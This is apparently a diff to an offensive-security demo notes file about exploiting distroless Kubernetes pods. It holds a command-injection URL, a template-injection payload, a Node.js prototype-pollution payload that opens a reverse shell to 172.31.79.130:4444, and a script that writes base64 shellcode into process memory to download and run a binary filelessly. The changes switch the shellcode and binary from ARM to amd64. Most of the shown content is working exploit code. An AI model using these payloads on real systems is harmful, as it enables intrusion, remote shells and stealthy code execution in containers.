@@ -23,7 +23,7 @@ command -v openssl #https://www.form3.tech/engineering/content/exploiting-distro
 
 
 # Demo 1: Python RCE
-kubectl port-forward dless-python-rce-pod 3001:8080
+kubectl port-forward dless-python-rce-pod 3001:3001
 
 ## No binaries
 http://localhost:3001/?cmd=ls
@@ -94,7 +94,7 @@ http://127.0.0.1:3002/?name={{(1).__class__.__base__.__subclasses__()[216]()._mo
 kubectl port-forward dless-express-pp-pod 3000:3000
 
 ## Reverse-shell
-http://127.0.0.1:3000/?exec=1&data={"__proto__": {"NODE_OPTIONS": "--require /proc/self/environ", "env": { "EVIL":"console.log(require(\"child_process\").fork(\"-e\",[\"net=require(`net`);cp=require(`child_process`);sh=cp.spawn(`/proc/self/exe`, [`-i`], {detached: true});client = new net.Socket();client.connect(4444, `172.17.0.3`, function(){client.pipe(sh.stdin);sh.stdout.pipe(client);sh.stderr.pipe(client);});//\"],{\"env\":{\"NODE_OPTIONS\":\"\"}}).toString())//"}}}
+http://127.0.0.1:3000/?exec=1&data={"__proto__": {"NODE_OPTIONS": "--require /proc/self/environ", "env": { "EVIL":"console.log(require(\"child_process\").fork(\"-e\",[\"net=require(`net`);cp=require(`child_process`);sh=cp.spawn(`/proc/self/exe`, [`-i`], {detached: true});client = new net.Socket();client.connect(4444, `172.31.79.130`, function(){client.pipe(sh.stdin);sh.stdout.pipe(client);sh.stderr.pipe(client);});//\"],{\"env\":{\"NODE_OPTIONS\":\"\"}}).toString())//"}}}
 
 ## Info
 ```js
@@ -135,16 +135,16 @@ http = require('http');
 https = require('https');
 const { fork } = require('child_process');
 
-// Code to execute a fork process taht will execute a shellcode with memfd_create
+// Code to execute a fork process that will execute a shellcode with memfd_create
 node_subp1_path = "/dev/shm/subp1.js"
 
-// memfd_create shellcode from https://github.com/arget13/DDexec (this is the one for ARM)
+// memfd_create shellcode from https://github.com/arget13/DDexec
 var node_subp1 = `
 fs = require('fs');
 var data = fs.readFileSync('/proc/self/syscall', {encoding:'utf8', flag:'r'});
 var mem_addr = data.split(" ")[8].trim();
 var dec_offset = Number(mem_addr);
-var shellcode_b64 = "gCiI0qCIqPLgDx/44AMAkSEAAcroIoDSAQAA1MgFgNIBAADUiBWA0gEAANRhAoDSKBCA0gEAANQ=";
+var shellcode_b64 = "aERFQURIiedIMfZIifC0AbA/DwVIicewTQ8FsCIPBQ==";
 var shellcode = Buffer.from(shellcode_b64, 'base64');
 fs.open('/proc/self/mem', 'a', function(err, fd) {
     fs.write(fd, shellcode, 0, shellcode.length, dec_offset, function(err,writtenbytes){});
@@ -189,7 +189,7 @@ function get_memfd_num(path){
     });
 }
 get_memfd_num(`/proc/${proc.pid}/fd`);
-memfd_file_path = "/proc/69/fd/20" // CHANGE THIS
+memfd_file_path = "/proc/60/fd/20" // CHANGE THIS
 
 // Download the binary to execute in the fd
 var download = function(url, dest) {
@@ -204,7 +204,7 @@ var download = function(url, dest) {
 };
 
 // CHANGE THE FD: /proc/80/fd/20
-download("https://storage.googleapis.com/kubernetes-release/release/v1.25.3/bin/linux/arm64/kubectl", memfd_file_path)
+download("https://storage.googleapis.com/kubernetes-release/release/v1.25.3/bin/linux/amd64/kubectl", memfd_file_path)
 
 // Execute the fd directly from the exec syscall
 fork("", [], {"execPath": memfd_file_path, "execArgv": []})
